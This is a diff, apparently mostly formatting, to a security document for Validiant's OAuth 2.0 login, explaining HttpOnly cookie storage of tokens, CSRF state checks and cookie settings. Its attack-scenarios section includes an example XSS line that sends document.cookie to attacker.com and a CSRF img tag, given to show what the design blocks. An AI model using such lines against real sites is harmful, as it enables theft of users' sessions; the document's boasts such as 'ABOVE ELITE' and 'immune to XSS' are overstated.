@@ -11,7 +11,9 @@ This document outlines the security measures implemented in Validiant's OAuth 2.
 ### **1. Token Leak via URL Query Strings (P0 - CRITICAL)**
 
 #### **The Vulnerability**
+
 Passing JWT tokens in URL query strings exposes them to:
+
 - **Browser History:** Tokens persist in browser history indefinitely
 - **Proxy Logs:** Corporate proxies and CDNs log full URLs with tokens
 - **Referrer Headers:** Tokens leak to third-party sites via HTTP Referrer
@@ -19,6 +21,7 @@ Passing JWT tokens in URL query strings exposes them to:
 - **Clipboard Sharing:** Users may copy/paste URLs containing tokens
 
 #### **Example of Vulnerable Flow**
+
 ```
 ❌ BAD: Redirect after OAuth
 https://app.example.com/callback?access_token=eyJhbGc...
@@ -30,19 +33,21 @@ Result:
 ```
 
 #### **Our Mitigation**
+
 We use **HttpOnly, Secure cookies** to store JWT tokens:
 
 ```typescript
 setCookie(c, 'access_token', tokens.accessToken, {
-  httpOnly: true,        // ✅ Prevents JavaScript access
-  secure: true,          // ✅ HTTPS-only transmission
-  sameSite: 'Lax',       // ✅ CSRF protection
-  maxAge: 3600,          // ✅ Auto-expires with token
-  path: '/',             // ✅ Available to all routes
+  httpOnly: true, // ✅ Prevents JavaScript access
+  secure: true, // ✅ HTTPS-only transmission
+  sameSite: 'Lax', // ✅ CSRF protection
+  maxAge: 3600, // ✅ Auto-expires with token
+  path: '/', // ✅ Available to all routes
 });
 ```
 
 **Benefits:**
+
 - ✅ Tokens never appear in URLs
 - ✅ Immune to XSS attacks (JavaScript cannot access)
 - ✅ Not logged by proxies or servers
@@ -54,15 +59,18 @@ setCookie(c, 'access_token', tokens.accessToken, {
 ### **2. Incomplete CSRF State Verification (P0 - CRITICAL)**
 
 #### **The Vulnerability**
+
 OAuth state parameter must be tied to the specific browser session to prevent CSRF attacks.
 
 **Attack Scenario Without Cookie Verification:**
+
 1. Attacker initiates OAuth and captures state in Redis
 2. Attacker tricks victim into clicking malicious callback URL with captured state
 3. Victim's browser completes OAuth flow
 4. Attacker's account gets linked to victim's OAuth profile
 
 #### **Our Mitigation**
+
 We implement **double-verification** using both Redis and HttpOnly cookies:
 
 ```typescript
@@ -71,10 +79,10 @@ const { authUrl, state } = await initiateGoogleOAuth();
 
 // Store state in HttpOnly cookie (tied to browser session)
 setCookie(c, 'oauth_state', state, {
-  httpOnly: true,        // ✅ Prevents JavaScript access
-  secure: true,          // ✅ HTTPS-only
-  sameSite: 'Lax',       // ✅ CSRF protection
-  maxAge: 600,           // ✅ 10-minute expiry
+  httpOnly: true, // ✅ Prevents JavaScript access
+  secure: true, // ✅ HTTPS-only
+  sameSite: 'Lax', // ✅ CSRF protection
+  maxAge: 600, // ✅ 10-minute expiry
 });
 
 // Step 2: OAuth Callback
@@ -90,6 +98,7 @@ deleteCookie(c, 'oauth_state');
 ```
 
 **Why This Works:**
+
 - ✅ State cookie is tied to victim's browser (attacker can't access it)
 - ✅ State in URL must match cookie (attacker can't forge this)
 - ✅ One-time use prevents replay attacks
@@ -102,6 +111,7 @@ deleteCookie(c, 'oauth_state');
 ### **Google OAuth Example**
 
 #### **Step 1: Initiation**
+
 ```http
 GET /api/v1/oauth/google HTTP/1.1
 Host: api.validiant.com
@@ -112,9 +122,11 @@ Set-Cookie: oauth_state=abc123; HttpOnly; Secure; SameSite=Lax; Max-Age=600
 ```
 
 #### **Step 2: User Authenticates**
+
 User logs in with Google and authorizes the app.
 
 #### **Step 3: OAuth Callback**
+
 ```http
 GET /api/v1/oauth/google/callback?code=xyz789&state=abc123 HTTP/1.1
 Host: api.validiant.com
@@ -136,12 +148,13 @@ Set-Cookie: oauth_state=; Max-Age=0  # Delete state cookie
 ```
 
 #### **Step 4: Frontend Access**
+
 ```javascript
 // Frontend CANNOT access tokens directly (HttpOnly)
 // But tokens are automatically sent with API requests
 
 fetch('https://api.validiant.com/api/v1/users/me', {
-  credentials: 'include',  // Send cookies
+  credentials: 'include', // Send cookies
 });
 
 // Server receives:
@@ -153,6 +166,7 @@ fetch('https://api.validiant.com/api/v1/users/me', {
 ## 🛡️ **Cookie Configuration Explained**
 
 ### **Access Token Cookie**
+
 ```typescript
 {
   httpOnly: true,        // JavaScript cannot access (XSS protection)
@@ -164,6 +178,7 @@ fetch('https://api.validiant.com/api/v1/users/me', {
 ```
 
 ### **Refresh Token Cookie**
+
 ```typescript
 {
   httpOnly: true,        // JavaScript cannot access
@@ -175,6 +190,7 @@ fetch('https://api.validiant.com/api/v1/users/me', {
 ```
 
 ### **OAuth State Cookie**
+
 ```typescript
 {
   httpOnly: true,        // JavaScript cannot access
@@ -186,6 +202,7 @@ fetch('https://api.validiant.com/api/v1/users/me', {
 ```
 
 ### **User ID Cookie (Metadata)**
+
 ```typescript
 {
   httpOnly: false,       // ✅ Frontend CAN access this
@@ -197,6 +214,7 @@ fetch('https://api.validiant.com/api/v1/users/me', {
 ```
 
 **Why user_id is NOT HttpOnly:**
+
 - Frontend needs to know which user is logged in
 - User ID is not sensitive (it's already in the JWT payload)
 - Frontend can use it for UI personalization
@@ -206,7 +224,9 @@ fetch('https://api.validiant.com/api/v1/users/me', {
 ## 🔥 **Attack Scenarios Prevented**
 
 ### **1. XSS Attack**
+
 **Attack:** Malicious script tries to steal tokens
+
 ```javascript
 // ❌ FAILS: HttpOnly cookies cannot be accessed
 console.log(document.cookie); // Does NOT contain access_token
@@ -214,28 +234,36 @@ fetch('https://attacker.com?token=' + document.cookie); // No token leaked
 ```
 
 ### **2. CSRF Attack**
+
 **Attack:** Malicious site tries to trigger OAuth callback
+
 ```html
 <!-- ❌ FAILS: SameSite=Lax blocks cross-site cookie sending -->
-<img src="https://api.validiant.com/api/v1/oauth/google/callback?code=...">
+<img src="https://api.validiant.com/api/v1/oauth/google/callback?code=..." />
 ```
 
 ### **3. Token Interception via Proxy**
+
 **Attack:** Corporate proxy logs all URLs
+
 ```
 ❌ FAILS: Tokens are in cookies (not logged)
 ✅ Cookie header is encrypted in HTTPS tunnel
 ```
 
 ### **4. URL Sharing**
+
 **Attack:** User copies callback URL and shares it
+
 ```
 ❌ FAILS: No tokens in URL
 ✅ URL: https://app.validiant.com/dashboard (clean)
 ```
 
 ### **5. OAuth State Reuse**
+
 **Attack:** Attacker tries to reuse captured state
+
 ```
 ❌ FAILS: State cookie is deleted after first use
 ❌ FAILS: State cookie tied to victim's browser (attacker can't access)
@@ -245,16 +273,16 @@ fetch('https://attacker.com?token=' + document.cookie); // No token leaked
 
 ## 📊 **Security Scorecard**
 
-| Threat | Mitigation | Status |
-|--------|------------|--------|
-| Token Leak via URL | HttpOnly cookies | ✅ PROTECTED |
-| XSS Token Theft | HttpOnly flag | ✅ PROTECTED |
-| CSRF OAuth Attack | SameSite + State Cookie | ✅ PROTECTED |
-| MITM Token Interception | Secure flag (HTTPS) | ✅ PROTECTED |
-| Token Replay | One-time state use | ✅ PROTECTED |
-| Session Hijacking | Redis-backed sessions | ✅ PROTECTED |
-| Proxy Logging | No tokens in URLs | ✅ PROTECTED |
-| Referrer Leakage | No tokens in URLs | ✅ PROTECTED |
+| Threat                  | Mitigation              | Status       |
+| ----------------------- | ----------------------- | ------------ |
+| Token Leak via URL      | HttpOnly cookies        | ✅ PROTECTED |
+| XSS Token Theft         | HttpOnly flag           | ✅ PROTECTED |
+| CSRF OAuth Attack       | SameSite + State Cookie | ✅ PROTECTED |
+| MITM Token Interception | Secure flag (HTTPS)     | ✅ PROTECTED |
+| Token Replay            | One-time state use      | ✅ PROTECTED |
+| Session Hijacking       | Redis-backed sessions   | ✅ PROTECTED |
+| Proxy Logging           | No tokens in URLs       | ✅ PROTECTED |
+| Referrer Leakage        | No tokens in URLs       | ✅ PROTECTED |
 
 **Overall Security Rating: ABOVE ELITE** 🏆
 
@@ -263,6 +291,7 @@ fetch('https://attacker.com?token=' + document.cookie); // No token leaked
 ## 🚀 **Production Deployment**
 
 ### **Required Environment Variables**
+
 ```bash
 # Production must set NODE_ENV=production
 NODE_ENV=production
@@ -274,10 +303,11 @@ NODE_ENV=production
 ```
 
 ### **Frontend Configuration**
+
 ```javascript
 // All API requests must include credentials
 fetch('https://api.validiant.com/api/v1/users/me', {
-  credentials: 'include',  // ✅ Send cookies with request
+  credentials: 'include', // ✅ Send cookies with request
   headers: {
     'Content-Type': 'application/json',
   },
@@ -285,13 +315,14 @@ fetch('https://api.validiant.com/api/v1/users/me', {
 ```
 
 ### **CORS Configuration**
+
 ```typescript
 // Backend must allow credentials from frontend origin
 cors({
-  origin: env.WEB_APP_URL,           // ✅ Specific origin only
-  credentials: true,                  // ✅ Allow cookies
-  allowHeaders: ['Content-Type'],     // ✅ No Authorization header needed
-})
+  origin: env.WEB_APP_URL, // ✅ Specific origin only
+  credentials: true, // ✅ Allow cookies
+  allowHeaders: ['Content-Type'], // ✅ No Authorization header needed
+});
 ```
 
 ---
